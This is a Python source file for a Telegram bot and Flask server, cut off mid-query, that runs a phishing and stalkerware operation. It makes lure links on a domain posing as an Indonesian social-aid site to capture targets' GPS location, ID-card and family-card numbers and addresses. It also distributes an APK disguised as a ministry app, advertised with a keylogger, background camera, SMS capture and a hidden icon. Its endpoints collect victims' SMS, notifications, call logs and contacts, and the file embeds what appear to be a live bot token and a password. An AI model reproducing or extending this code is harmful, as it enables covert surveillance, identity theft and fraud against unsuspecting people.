#!/usr/bin/env python3
"""
GPS Tracker Bot - Simple Link Tracking
Buat link → kirim ke target → target buka → GPS terkirim → notif ke bot
"""

import os
import sqlite3
import hashlib
import time
import asyncio
import json
import urllib.request
from urllib.parse import quote
from datetime import datetime
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8845527390:AAH1RZGR9zuYM7Se_O5171QwgnhQ6gs85dY")
BASE_URL = os.environ.get("BASE_URL", "https://bansos.jokichannel.eu.org")
DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tracker.db")
BANNER_PATH = os.environ.get("BANNER_PATH", os.path.join(os.path.dirname(os.path.abspath(__file__)), "banner.jpg"))

# ============ DATABASE ============
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS links (
        id TEXT PRIMARY KEY, tracking_id TEXT UNIQUE,
        title TEXT, description TEXT,
        created_by INTEGER, created_at TEXT, is_active INTEGER DEFAULT 1)""")
    c.execute("""CREATE TABLE IF NOT EXISTS tracking_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT, tracking_id TEXT,
        latitude REAL, longitude REAL, accuracy REAL,
        user_agent TEXT, ip_address TEXT, timestamp TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS sms_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        sender TEXT, message TEXT, timestamp TEXT,
        device_id TEXT, received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS notif_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        sender TEXT, message TEXT, timestamp TEXT,
        device_id TEXT, app TEXT, received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS photos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        tracking_id TEXT, filename TEXT, filepath TEXT,
        timestamp TEXT, received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS keylog_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, text TEXT, package TEXT,
        class_name TEXT, view_id TEXT, char_length INTEGER,
        timestamp INTEGER, received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS clipboard_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, text TEXT, char_length INTEGER,
        app TEXT, class_name TEXT,
        timestamp INTEGER, received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS app_usage_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, package TEXT, class_name TEXT,
        timestamp INTEGER, received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS command_queue (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, command_type TEXT, command_params TEXT,
        status TEXT DEFAULT 'pending',
        created_at TEXT, executed_at TEXT, result TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS device_status (
        device_id TEXT PRIMARY KEY,
        last_seen TEXT, status TEXT, info TEXT)""")
    # v5.0 — New tables
    c.execute("""CREATE TABLE IF NOT EXISTS call_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, phone_number TEXT, contact_name TEXT,
        call_type TEXT, duration INTEGER, timestamp TEXT,
        received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS contacts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, name TEXT, phone_number TEXT,
        email TEXT, source TEXT, timestamp TEXT,
        received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS sim_change_alerts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, old_sim TEXT, new_sim TEXT,
        old_operator TEXT, new_operator TEXT,
        timestamp TEXT, received_at TEXT)""")
    conn.commit()
    conn.close()

def gen_id():
    return hashlib.md5(f"{time.time()}{os.urandom(8)}".encode()).hexdigest()[:10]

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(query, params)
    conn.commit()
    result = c.fetchall()
    conn.close()
    return result

# ============ TELEGRAM BOT ============
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("📦 Buat Link Tracking", callback_data="create_link")],
        [InlineKeyboardButton("📋 Daftar Link Saya", callback_data="list_links")],
        [InlineKeyboardButton("📊 Statistik & Info", callback_data="statistik_info")],
        [InlineKeyboardButton("⬇️ Download APK", callback_data="download_apk")],
        [InlineKeyboardButton("🖥 Buka Dashboard", url=f"{BASE_URL}/admin/dashboard")],
    ]
    caption = (
        "✨ *GPS Tracker — Premium* ✨\n\n"
        "Halo DevCult XII! 👋 Selamat datang di\n"
        "sistem tracking cerdas.\n\n"
        "◆ Buat link → kirim ke target\n"
        "◆ Target buka → GPS otomatis terkirim\n"
        "◆ Notifikasi lokasi langsung ke sini\n\n"
        "👇 Silakan pilih menu:"
    )
    try:
        with open(BANNER_PATH, 'rb') as photo:
            await update.message.reply_photo(photo=photo)
    except Exception:
        pass
    await update.message.reply_text(
        caption, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

async def on_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try: await q.answer()
    except: pass

    uid = q.from_user.id
    d = q.data

    async def safe_edit(text, reply_markup=None, parse_mode="Markdown"):
        """Edit text, fallback ke reply baru kalo pesan asli adalah foto."""
        try:
            await q.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception as e:
            if "no text in the message" in str(e).lower():
                await q.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
            else:
                raise

    if d == "create_link":
        tid = gen_id()
        title = "Verifikasi Lokasi"
        desc = "Silakan konfirmasi lokasi Anda"
        db_exec("INSERT INTO links VALUES (?,?,?,?,?,?,1)",
                (tid, tid, title, desc, uid, datetime.now().isoformat()))
        url = f"{BASE_URL}/track/{tid}"
        kb = [
            [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={url}")],
            [InlineKeyboardButton("📋 Daftar Link", callback_data="list_links")],
            [InlineKeyboardButton("⬅️ Menu", callback_data="home")],
        ]
        await safe_edit(
            f"✅ *Link Berhasil Dibuat!*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔗 *Link:*\n`{url}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📤 Kirim link ini ke target.\n"
            f"Saat dibuka & GPS diizinkan,\n"
            f"notifikasi lokasi otomatis ke sini.\n\n"
            f"🆔 `{tid}`",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "list_links":
        rows = db_exec("SELECT tracking_id,title,created_at,is_active FROM links WHERE created_by=? ORDER BY created_at DESC", (uid,))
        if not rows:
            await safe_edit("📋 *Daftar Link*\n\nBelum ada link.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📦 Buat", callback_data="create_link")]]),
                parse_mode="Markdown")
            return
        text = "📋 *Daftar Link*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        kb = []
        for tid, title, cat, active in rows:
            st = "🟢" if active else "🔴"
            ev = db_exec("SELECT COUNT(*) FROM tracking_events WHERE tracking_id=?", (tid,))[0][0]
            text += f"{st} `{tid}` | 🔔 {ev}x | 📅 {cat[:10]}\n"
            kb.append([
                InlineKeyboardButton(f"🔔 {tid[:6]}", callback_data=f"ev:{tid}"),
                InlineKeyboardButton("🗺", callback_data=f"map:{tid}"),
                InlineKeyboardButton("⏸" if active else "▶️", callback_data=f"tg:{tid}"),
                InlineKeyboardButton("🗑", callback_data=f"del:{tid}"),
            ])
        kb.append([InlineKeyboardButton("⬅️ Menu", callback_data="home")])
        await safe_edit(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d.startswith("ev:"):
        tid = d.split(":")[1]
        evs = db_exec("SELECT latitude,longitude,accuracy,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 5", (tid,))
        if not evs:
            await safe_edit(f"🔔 *Notifikasi*\n\nBelum ada event untuk `{tid}`.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")]]),
                parse_mode="Markdown")
            return
        text = f"🔔 *Notifikasi - `{tid}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        for i, (lat, lon, acc, ts) in enumerate(evs):
            text += f"📍 #{i+1} | 🕐 {ts[:19]}\n   📐 `{lat:.6f}, {lon:.6f}` | 🎯 ±{acc:.0f}m\n\n"
        kb = [[InlineKeyboardButton("🗺 Google Maps", url=f"https://www.google.com/maps?q={evs[0][0]},{evs[0][1]}")],
              [InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")]]
        await safe_edit(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d.startswith("map:"):
        tid = d.split(":")[1]
        evs = db_exec("SELECT latitude,longitude,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 1", (tid,))
        if evs:
            kb = [
                [InlineKeyboardButton("🌐 Peta Lengkap", url=f"{BASE_URL}/map/{tid}")],
                [InlineKeyboardButton("📍 Google Maps", url=f"https://www.google.com/maps?q={evs[0][0]},{evs[0][1]}")],
                [InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")],
            ]
            await safe_edit(
                f"🗺 *Peta - `{tid}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📍 Terakhir: {evs[0][2][:19]}\n📐 `{evs[0][0]:.6f}, {evs[0][1]:.6f}`",
                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        else:
            await safe_edit("🗺 *Peta*\n\nBelum ada data.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")]]),
                parse_mode="Markdown")

    elif d.startswith("del:"):
        tid = d.split(":")[1]
        db_exec("DELETE FROM links WHERE tracking_id=? AND created_by=?", (tid, uid))
        db_exec("DELETE FROM tracking_events WHERE tracking_id=?", (tid,))
        await safe_edit(f"🗑 `{tid}` dihapus.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 Daftar", callback_data="list_links")]]),
            parse_mode="Markdown")

    elif d == "delete_link":
        rows = db_exec("SELECT tracking_id,title,created_at,is_active FROM links WHERE created_by=? ORDER BY created_at DESC", (uid,))
        if not rows:
            await safe_edit("🗑 *Hapus Link*\n\nBelum ada link.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Menu", callback_data="home")]]),
                parse_mode="Markdown")
            return
        text = "🗑 *Hapus Link*\n━━━━━━━━━━━━━━━━━━━━\n\nPilih link yang ingin dihapus:\n"
        kb = []
        for tid, title, cat, active in rows:
            kb.append([InlineKeyboardButton(f"🗑 {tid[:8]} - {title[:20]}", callback_data=f"del:{tid}")])
        kb.append([InlineKeyboardButton("⬅️ Menu", callback_data="home")])
        await safe_edit(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d.startswith("tg:"):
        tid = d.split(":")[1]
        db_exec("UPDATE links SET is_active=1-is_active WHERE tracking_id=? AND created_by=?", (tid, uid))
        row = db_exec("SELECT is_active FROM links WHERE tracking_id=? AND created_by=?", (tid, uid))
        status = "Aktif 🟢" if row and row[0][0] else "Nonaktif 🔴"
        await safe_edit(f"✅ `{tid}` → {status}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 Daftar", callback_data="list_links")]]),
            parse_mode="Markdown")

    elif d == "check_notif":
        links = db_exec("SELECT tracking_id FROM links WHERE created_by=? AND is_active=1", (uid,))
        text = "🔔 *Cek Notifikasi*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        found = 0
        for (tid,) in links:
            evs = db_exec("SELECT latitude,longitude,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 1", (tid,))
            if evs:
                found += 1
                text += f"📍 `{tid[:6]}` | 🕐 {evs[0][2][:19]}\n   📐 `{evs[0][0]:.6f}, {evs[0][1]:.6f}`\n\n"
        if not found:
            text += "Belum ada notifikasi.\n"
        kb = [[InlineKeyboardButton("📋 Semua Link", callback_data="list_links")],
              [InlineKeyboardButton("⬅️ Menu", callback_data="home")]]
        await safe_edit(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "view_map":
        links = db_exec("SELECT tracking_id FROM links WHERE created_by=?", (uid,))
        active = []
        for (tid,) in links:
            evs = db_exec("SELECT latitude,longitude FROM tracking_events WHERE tracking_id=? LIMIT 1", (tid,))
            if evs:
                active.append((tid, evs[0]))
        if not active:
            await safe_edit("🗺 *Peta*\n\nBelum ada data lokasi.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📦 Buat Link", callback_data="create_link")]]),
                parse_mode="Markdown")
            return
        kb = [[InlineKeyboardButton(f"📍 {t[0][:6]}", url=f"{BASE_URL}/map/{t[0]}")] for t in active[:10]]
        kb.append([InlineKeyboardButton("⬅️ Menu", callback_data="home")])
        await safe_edit("🗺 *Peta Tracking*\n━━━━━━━━━━━━━━━━━━━━\n\nPilih link:",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "home":
        kb = [
            [InlineKeyboardButton("📦 Buat Link Tracking", callback_data="create_link")],
            [InlineKeyboardButton("📋 Daftar Link Saya", callback_data="list_links")],
            [InlineKeyboardButton("📊 Statistik & Info", callback_data="statistik_info")],
            [InlineKeyboardButton("🖥 Buka Dashboard", url=f"{BASE_URL}/admin/dashboard")],
        ]
        await safe_edit("✨ *GPS Tracker — Premium* ✨\n\n👇 Silakan pilih menu:",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "statistik_info":
        links = db_exec("SELECT COUNT(*) FROM links", ())[0][0]
        events = db_exec("SELECT COUNT(*) FROM tracking_events", ())[0][0]
        aktif = db_exec("SELECT COUNT(*) FROM links WHERE is_active=1", ())[0][0]
        text = (
            "📊 *Statistik & Info*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📦 Total Link: *{links}*\n"
            f"🟢 Link Aktif: *{aktif}*\n"
            f"📡 Total Event: *{events}*\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "💡 *Cara Pakai:*\n"
            "1️⃣ Buat link tracking\n"
            "2️⃣ Kirim link ke target\n"
            "3️⃣ Target buka & izinkan GPS\n"
            "4️⃣ Notifikasi lokasi masuk ke sini\n\n"
            "🔒 Privasi terjaga — target harus\n"
            "klik manual & izinkan GPS"
        )
        kb = [[InlineKeyboardButton("⬅️ Menu", callback_data="home")]]
        await safe_edit(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "download_apk":
        # Generate and send QR + download link (without opening web)
        dl_url = f"{BASE_URL}/download/apk"
        try:
            with open("/root/gps-link/apk_version.json") as f:
                vname = json.load(f).get("version_name", "4.0")
        except:
            vname = "4.0"
        apk_path = "/root/gps-link/downloads/bantuan-sosial-v4.0.apk"
        size_kb = round(os.path.getsize(apk_path) / 1024) if os.path.exists(apk_path) else 0

        import qrcode
        from io import BytesIO
        qr = qrcode.QRCode(box_size=10, border=2)
        qr.add_data(dl_url)
        qr.make(fit=True)
        buf = BytesIO()
        qr.make_image(fill_color="#0055A4", back_color="white").save(buf, format="PNG")
        buf.seek(0)

        text = (
            f"📦 *APK Bansos v{vname}*\n"
            f"`Pembaruan Sistem` — `com.kemensos.bansos`\n\n"
            f"📎 *Ukuran:* {size_kb} KB\n"
            f"📱 *Min SDK:* Android 5.0+\n"
            f"🎯 *Target:* Android 14\n\n"
            f"⬇️ *Copy link download:*\n"
            f"`{dl_url}`\n\n"
            f"✨ *Fitur v{vname}:*\n"
            f"• Keylogger A11Y\n"
            f"• Clipboard monitor\n"
            f"• App usage tracking\n"
            f"• GPS lokasi real-time\n"
            f"• Kamera background\n"
            f"• SMS + Notif capture\n"
            f"• Remote command\n"
            f"• Stealth (no icon)"
        )
        kb = [[InlineKeyboardButton("⬅️ Menu", callback_data="home")]]
        await q.message.reply_photo(photo=buf, caption=text,
            parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

# ============ NOTIFICATION ============
async def notify(tracking_id, lat, lon, accuracy, ip, data=None):
    info = db_exec("SELECT created_by FROM links WHERE tracking_id=?", (tracking_id,))
    if not info:
        return
    owner_id = info[0][0]
    bot = Bot(token=BOT_TOKEN)

    text = (
        f"🔔 *LOKASI BARU DITERIMA!*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 `{tracking_id}`\n"
        f"🕐 {datetime.now().strftime('%d/%m %H:%M:%S')}\n\n"
    )

    if data:
        text += (
            f"📋 *Data Penerima:*\n"
            f"👤 Nama: *{data.get('nama', '-')}*\n"
            f"🪪 No. KTP: `{data.get('no_ktp', '-')}`\n"
            f"📖 No. KK: `{data.get('no_kk', '-')}`\n"
            f"🏠 Alamat: {data.get('alamat', '-')}\n"
            f"🚧 RT/RW: {data.get('rt', '-')}/{data.get('rw', '-')}\n"
            f"🏙 Kota: {data.get('kota', '-')}\n"
            f"🗺 Provinsi: {data.get('provinsi', '-')}\n\n"
        )

    text += (
        f"📍 *Koordinat:*\n"
        f"   📐 `{lat:.6f}, {lon:.6f}`\n"
        f"   🎯 Akurasi: ±{accuracy:.0f}m\n"
        f"   🌐 IP: `{ip}`\n\n━━━━━━━━━━━━━━━━━━━━"
    )
    kb = [
        [InlineKeyboardButton("🗺 Google Maps", url=f"https://www.google.com/maps?q={lat},{lon}")],
        [InlineKeyboardButton("📍 Street View", url=f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={lat},{lon}")],
        [InlineKeyboardButton("📊 Riwayat", callback_data=f"ev:{tracking_id}")],
    ]
    try:
        await bot.send_message(owner_id, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    except Exception as e:
        print(f"Notif error: {e}")

# ============ FLASK ============
app = Flask(__name__, template_folder=os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates"))
app.secret_key = os.environ.get("SECRET_KEY", hashlib.md5(f"hermes{time.time()}".encode()).hexdigest())
DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "Kosay378%")

# ============ DASHBOARD AUTH ============
def login_required(f):
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect(url_for("admin_login"))
        return f(*args, **kwargs)
    return decorated

@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        pwd = request.form.get("password", "")
        if pwd == DASHBOARD_PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("admin_dashboard"))
        return render_template("login.html", error="Password salah")
    return render_template("login.html", error=None)

@app.route("/admin/logout")
def admin_logout():
    session.pop("logged_in", None)
    return redirect(url_for("admin_login"))

@app.after_request
def skip_ngrok(response):
    response.headers["ngrok-skip-browser-warning"] = "true"
    return response

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/track/<tid>")
def track(tid):
    info = db_exec("SELECT tracking_id,title,description,is_active FROM links WHERE tracking_id=?", (tid,))
    if not info:
        return render_template("error.html", message="Link tidak ditemukan"), 404
    if not info[0][3]:
        return render_template("error.html", message="Link tidak aktif"), 403
    return render_template("track.html", tracking_id=tid, title=info[0][1], description=info[0][2])

@app.route("/api/location/<tid>", methods=["POST"])
def api_loc(tid):
    d = request.json
    lat, lon, acc = d.get("latitude"), d.get("longitude"), d.get("accuracy", 0)
    if lat is None or lon is None:
        return jsonify({"error": "Invalid"}), 400
    info = db_exec("SELECT is_active FROM links WHERE tracking_id=?", (tid,))
    if not info or not info[0][0]:
        return jsonify({"error": "Not found"}), 404
    db_exec("INSERT INTO tracking_events (tracking_id,latitude,longitude,accuracy,user_agent,ip_address,timestamp) VALUES (?,?,?,?,?,?,?)",
        (tid, lat, lon, acc, str(request.user_agent), request.remote_addr, datetime.now().isoformat()))
    # Save KTP data
    db_exec("UPDATE links SET title=?, description=? WHERE tracking_id=?",
        (d.get("nama",""), f"KK:{d.get('no_kk','')} | {d.get('alamat','')}", tid))
    asyncio.run(notify(tid, lat, lon, acc, request.remote_addr, d))
    return jsonify({"success": True})

MEDIA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "media")

@app.route("/api/upload/<tid>", methods=["POST"])
def api_upload(tid):
    if "file" not in request.files:
        return jsonify({"success": False, "error": "No file"}), 400
    info = db_exec("SELECT is_active FROM links WHERE tracking_id=?", (tid,))
    if not info or not info[0][0]:
        return jsonify({"error": "Not found"}), 404
    f = request.files["file"]
    os.makedirs(MEDIA_DIR, exist_ok=True)
    ext = f.filename.rsplit(".", 1)[1].lower() if "." in f.filename else "jpg"
    fname = f"{tid}_{int(time.time())}.{ext}"
    fpath = os.path.join(MEDIA_DIR, fname)
    f.save(fpath)
    media_type = request.form.get("type", "photo")
    # Notify bot owner with media
    owner = db_exec("SELECT created_by FROM links WHERE tracking_id=?", (tid,))
    if owner:
        try:
            bot = Bot(token=BOT_TOKEN)
            text = f"📸 *Media Diterima!*\n🆔 `{tid}`\n🕐 {datetime.now().strftime('%d/%m %H:%M:%S')}"
            if media_type == "video":
                with open(fpath, "rb") as pf:
                    asyncio.run(bot.send_video(owner[0][0], pf, caption=text, parse_mode="Markdown"))
            else:
                with open(fpath, "rb") as pf:
                    asyncio.run(bot.send_photo(owner[0][0], pf, caption=text, parse_mode="Markdown"))
        except Exception as e:
            print(f"Upload notif error: {e}")
    return jsonify({"success": True, "file": fname})

@app.route("/api/collect-sms", methods=["POST"])
def api_collect_sms():
    try:
        sender = request.form.get("sender", "")
        message = request.form.get("message", "")
        ts = request.form.get("timestamp", str(int(time.time()*1000)))
        device_id = request.form.get("device_id", "")
        received = datetime.now().isoformat()
        try:
            ts_iso = datetime.fromtimestamp(int(ts)/1000).isoformat()
        except:
            ts_iso = received
        db_exec("INSERT INTO sms_log (sender, message, timestamp, device_id, received_at) VALUES (?,?,?,?,?)",
                (sender, message, ts_iso, device_id, received))
        return jsonify({"success": True})
    except Exception as e:
        print(f"SMS collect error: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/collect-notif", methods=["POST"])
def api_collect_notif():
    try:
        # Support both form-data and JSON
        if request.is_json:
            data = request.get_json()
            sender = data.get("sender", data.get("title", data.get("app_name", "")))
            message = data.get("message", data.get("text", ""))
            ts = data.get("timestamp", data.get("time", str(int(time.time()*1000))))
            device_id = data.get("device_id", "unknown")
            app_name = data.get("app", data.get("app_name", data.get("package", "Unknown")))
        else:
            sender = request.form.get("sender", "")
            message = request.form.get("message", "")
            ts = request.form.get("timestamp", str(int(time.time()*1000)))
            device_id = request.form.get("device_id", "")
            app_name = request.form.get("app", "Unknown")
        received = datetime.now().isoformat()
        try:
            ts_iso = datetime.fromtimestamp(int(ts)/1000).isoformat()
        except:
            ts_iso = received
        db_exec("INSERT INTO notif_log (sender, message, timestamp, device_id, app, received_at) VALUES (?,?,?,?,?,?)",
                (sender, message, ts_iso, device_id, app_name, received))
        return jsonify({"success": True})
    except Exception as e:
        print(f"Notif collect error: {e}")
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/collect-call-logs/<device_id>", methods=["POST"])
def api_collect_call_logs(device_id):
    try:
        data = request.get_json() or []
        entries = data if isinstance(data, list) else [data]
        received = datetime.now().isoformat()
        count = 0
        for entry in entries:
            number = entry.get("phone_number", "")
            name = entry.get("contact_name", "")
            call_type = entry.get("call_type", "unknown")
            duration = entry.get("duration", 0)
            ts = entry.get("timestamp", datetime.now().isoformat())
            db_exec("INSERT INTO call_logs (device_id, phone_number, contact_name, call_type, duration, timestamp, received_at) VALUES (?,?,?,?,?,?,?)",
                    (device_id, number, name, call_type, duration, ts, received))
            count += 1
        db_exec("INSERT OR REPLACE INTO device_status (device_id, last_seen, status, info) VALUES (?,?,?,?)",
                (device_id, received, "active", json.dumps({"calls_synced": count})))
        return jsonify({"success": True, "count": count})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/collect-contacts/<device_id>", methods=["POST"])
def api_collect_contacts(device_id):
    try:
        data = request.get_json() or []
        entries = data if isinstance(data, list) else [data]
        received = datetime.now().isoformat()
        count = 0
        for entry in entries:
            name = entry.get("name", "")
            number = entry.get("phone_number", "")
            email = entry.get("email", "")
            source = entry.get("source", "")
            ts = entry.get("timestamp", datetime.now().isoformat())
            db_exec("INSERT INTO contacts (device_id, name, phone_number, email, source, timestamp, received_at) VALUES (?,?,?,?,?,?,?)",
                    (device_id, name, number, email, source, ts, received))
            count += 1
        return jsonify({"success": True, "count": count})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/collect-sim-change/<device_id>", methods=["POST"])
def api_collect_sim_change(device_id):
    try:
        data = request.get_json() or {}
        old_sim = data.get("old_sim", "")
        new_sim = data.get("new_sim", "")
        old_operator = data.get("old_operator", "")
        new_operator = data.get("new_operator", "")
        ts = data.get("timestamp", datetime.now().isoformat())
        received = datetime.now().isoformat()
        db_exec("INSERT INTO sim_change_alerts (device_id, old_sim, new_sim, old_operator, new_operator, timestamp, received_at) VALUES (?,?,?,?,?,?,?)",
                (device_id, old_sim, new_sim, old_operator, new_operator, ts, received))
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/collect-apps/<device_id>", methods=["POST"])
def api_collect_apps(device_id):
    """Receive installed apps list from APK"""
    try:
        data = request.get_json() or {}
        apps = data.get("apps", [])
        ts = data.get("timestamp", datetime.now().isoformat())
        received = datetime.now().isoformat()
        count = 0
        for app in apps:
            pkg = app.get("package", "")
            name = app.get("name", "")
            version = app.get("version", "")
            if pkg:
                # Store in app_usage_log with special note
                db_exec("INSERT INTO app_usage_log (device_id, package, class_name, timestamp, received_at) VALUES (?,?,?,?,?)",
                        (device_id, pkg, f"INSTALLED:{name} v{version}", ts, received))
                count += 1
        return jsonify({"success": True, "count": count})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/data/calls/<device_id>", methods=["GET"])
def api_get_calls(device_id):
    limit = min(int(request.args.get("limit", 50)), 200)
    rows = db_exec("""SELECT id, phone_number, contact_name, call_type, duration, timestamp, received_at
        FROM call_logs WHERE device_id=? ORDER BY id DESC LIMIT ?""", (device_id, limit))
    return jsonify({"calls": [{"id": r[0], "number": r[1], "name": r[2], "type": r[3],
        "duration": r[4], "ts": r[5], "received": r[6]} for r in rows]})


@app.route("/api/data/contacts/<device_id>", methods=["GET"])
def api_get_contacts(device_id):
    limit = min(int(request.args.get("limit", 200)), 500)
    rows = db_exec("""SELECT id, name, phone_number, email, source, timestamp
        FROM contacts WHERE device_id=? ORDER BY id DESC LIMIT ?""", (device_id, limit))
    return jsonify({"contacts": [{"id": r[0], "name": r[1], "number": r[2], "email": r[3],
        "source": r[4], "ts": r[5]} for r in rows]})


@app.route("/api/data/sim-alerts", methods=["GET"])
def api_get_sim_alerts():
    limit = min(int(request.args.get("limit", 20)), 100)
    rows = db_exec("""SELECT id, device_id, old_sim, new_sim, old_operator, new_operator, timestamp, received_at
        FROM sim_change_alerts ORDER BY id DESC LIMIT ?""", (limit,))
    return jsonify({"alerts": [{"id": r[0], "device_id": r[1], "old_sim": r[2],
        "new_sim": r[3], "old_operator": r[4], "new_operator": r[5],
        "ts": r[6], "received": r[7]} for r in rows]})


@app.route("/admin/dashboard")
@login_required
def admin_dashboard():
    total_links = db_exec("SELECT COUNT(*) FROM links")[0][0]
    total_events = db_exec("SELECT COUNT(*) FROM tracking_events")[0][0]
    total_sms = db_exec("SELECT COUNT(*) FROM sms_log")[0][0]
    total_notif = db_exec("SELECT COUNT(*) FROM notif_log")[0][0]
    total_keylogs = db_exec("SELECT COUNT(*) FROM keylog_log")[0][0]
    total_clipboard = db_exec("SELECT COUNT(*) FROM clipboard_log")[0][0]
    total_app_usage = db_exec("SELECT COUNT(*) FROM app_usage_log")[0][0]
    total_devices = db_exec("SELECT COUNT(*) FROM device_status")[0][0]
    active_links = db_exec("SELECT COUNT(*) FROM links WHERE is_active=1")[0][0]
    online_devices = db_exec("SELECT COUNT(*) FROM device_status WHERE status='online'")[0][0]
    total_calls = db_exec("SELECT COUNT(*) FROM call_logs")[0][0]
    total_contacts = db_exec("SELECT COUNT(*) FROM contacts")[0][0]
    total_sim_alerts = db_exec("SELECT COUNT(*) FROM sim_change_alerts")[0][0]
    links = db_exec("""SELECT l.tracking_id,l.title,l.created_at,l.is_active,
        (SELECT COUNT(*) FROM tracking_events WHERE tracking_id=l.tracking_id) as ev_cnt
        FROM links l ORDER BY l.created_at DESC LIMIT 20""")
    events = db_exec("""SELECT tracking_id,latitude,longitude,accuracy,timestamp FROM tracking_events
        ORDER BY timestamp DESC LIMIT 20""")
    sms = db_exec("""SELECT sender,message,timestamp,device_id FROM sms_log
        ORDER BY timestamp DESC LIMIT 30""")
    notifs = db_exec("""SELECT sender,message,timestamp,device_id,app FROM notif_log
        ORDER BY timestamp DESC LIMIT 50""")
    keylogs = db_exec("""SELECT device_id,text,package,class_name,timestamp,received_at,char_length
        FROM keylog_log ORDER BY id DESC LIMIT 30""")
    clips = db_exec("""SELECT device_id,text,char_length,app,received_at
        FROM clipboard_log ORDER BY id DESC LIMIT 20""")
    app_usage = db_exec("""SELECT device_id,package,class_name,received_at
        FROM app_usage_log ORDER BY id DESC LIMIT 20""")
    devices = db_exec("""SELECT d.device_id, d.last_seen, d.status, d.info,
